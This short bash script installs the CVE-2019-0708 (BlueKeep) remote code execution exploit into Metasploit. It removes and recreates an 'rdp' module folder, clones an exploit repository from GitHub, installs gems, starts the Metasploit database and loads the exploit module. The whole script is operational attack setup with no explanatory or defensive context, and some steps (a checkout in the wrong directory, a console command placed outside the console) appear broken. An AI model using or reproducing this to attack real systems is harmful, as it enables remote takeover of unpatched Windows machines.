#!/usr/bin/bash
cd /usr/share/metasploit-framework/modules/exploits/windows
    rm -rf rdp
    mkdir -p rdp
        cd rdp
            git clone https://github.com/nu11secur1ty/cve_2019_0708_bluekeep_rce.git
            cd /usr/share/metasploit-framework/
                git checkout bluekeep
                gem install bundler && bundle
                cd 
        msfdb init
        msfconsole 
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
